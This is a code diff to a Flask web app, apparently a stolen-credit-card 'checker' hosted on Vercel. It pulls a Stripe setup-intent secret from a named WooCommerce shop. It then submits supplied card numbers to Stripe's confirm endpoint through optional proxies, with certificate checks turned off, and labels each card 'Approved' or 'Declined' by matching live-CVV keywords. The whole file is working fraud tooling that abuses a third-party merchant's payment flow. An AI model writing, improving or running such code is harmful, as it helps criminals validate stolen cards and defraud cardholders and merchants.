@@ -7,18 +7,8 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 app = Flask(__name__)
 
-# Keywords that indicate live CVV
-CVV_LIVE_KEYWORDS = [
-    "succeeded", "payment_method.attached", "payment_method.created",
-    "setup_intent.succeeded", "payment_method_saved", "card_verified",
-    "card_tokenized", "verified_card", "cvv_passed", "cvc_check: pass",
-    "card_live", "live cvv", "Your payment method was saved",
-    "Card successfully added", "Card has been verified",
-    "Payment method added successfully", "SetupIntent status: succeeded",
-    "Payment method saved"
-]
+CVV_LIVE_KEYWORDS = ["succeeded", "setup_intent.succeeded", "cvv_passed", "card_verified"]
 
-# Build proxy dictionary from string
 def build_proxy(proxy_str):
     try:
         ip, port, user, pw = proxy_str.split(":")
@@ -29,11 +19,11 @@ def build_proxy(proxy_str):
     except:
         return None
 
-@app.route('/')
+@app.route("/")
 def home():
-    return "Flask is working on Vercel!"
+    return "✅ Flask is working on Vercel!"
 
-@app.route('/check', methods=['GET'])
+@app.route("/check", methods=['GET'])
 def check_card():
     cc = request.args.get("cc")
     proxy_param = request.args.get("proxy")
@@ -51,20 +41,22 @@ def check_card():
     proxies = build_proxy(proxy_param) if proxy_param else None
 
     try:
-        # Get client_secret from WooCommerce Stripe
         setup = requests.post(
             "https://shopzone.nz/?wc-ajax=wc_stripe_frontend_request&path=/wc-stripe/v1/setup-intent",
             data={"payment_method": "stripe_cc"},
             headers={"User-Agent": "Mozilla/5.0"},
             proxies=proxies,
             timeout=30,
-            verify=False
+            verify=False  # Can be the problem!
         )
 
-        seti = setup.text.split('{"client_secret":"')[1].split('"}')[0]
-        secret = setup.text.split('{"client_secret":"')[1].split('_secret_')[0]
+        text = setup.text
+        if '{"client_secret":"' not in text:
+            return f"Declined: no client_secret - {text[:100]}", 500
 
-        # Submit card to Stripe confirm endpoint
+        seti = text.split('{"client_secret":"')[1].split('"}')[0]
+        secret = text.split('{"client_secret":"')[1].split('_secret_')[0]
+
         confirm = requests.post(
             f"https://api.stripe.com/v1/setup_intents/{secret}/confirm",
             data={
@@ -84,13 +76,10 @@ def check_card():
             verify=False
         )
 
-        response_data = confirm.json()
-        raw = json.dumps(response_data).lower()
-
+        raw = json.dumps(confirm.json()).lower()
         if "succeeded" in raw or any(k in raw for k in CVV_LIVE_KEYWORDS):
             return "Approved"
-        else:
-            return "Declined"
+        return "Declined"
 
     except Exception as e:
-        return "Declined", 500
+        return f"Declined: {str(e)}", 500
